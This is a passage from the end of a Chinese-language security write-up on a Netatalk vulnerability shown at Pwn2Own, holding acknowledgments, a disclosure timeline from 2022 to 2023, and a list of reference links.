ZDI 和 Western Digital 对 P2O 比赛的组织，尤其是考虑到参赛团队数量和他们为我们的利用搭建环境的帮助。 Netatalk
团队为这个开源项目投入了大量的工作和努力

## 提交时间线

  * 2022-06-03 - 漏洞细节报告提交
  * 2023-02-06 - 官方协商公布

> [1] <https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin>  
>  [2] <http://netatalk.sourceforge.net/>  
>  [3] <https://github.com/Netatalk/Netatalk>  
>  [4] <https://support-en.wd.com/app/products/product-> detail/p/1369#WD_download>  
>  [5] <https://en.wikipedia.org/wiki/Data_Stream_Interface>  
>  [6] <https://scapy.net/>

